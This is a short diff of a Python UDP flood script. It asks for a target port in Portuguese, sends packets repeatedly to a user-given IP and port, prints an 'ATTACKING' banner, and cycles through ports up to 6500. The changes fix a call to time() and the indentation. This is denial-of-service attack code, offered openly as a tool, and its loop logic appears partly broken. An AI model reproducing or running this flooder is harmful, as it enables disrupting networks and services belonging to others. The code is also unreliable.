@@ -8,11 +8,11 @@ port = int(input("digite a porta:"))
 
 while True:
        while 1:
-              if .time() > timeout:
+              if time() > timeout:
                   break
               else:
                   pass
 sock.sendto(bytes, (ip, port))
 print (" ( + ) ATTACKING SEND BY SYXZ - ")
-if port == 6500:
-  port = 1
+  if port == 6500:
+    port = 1
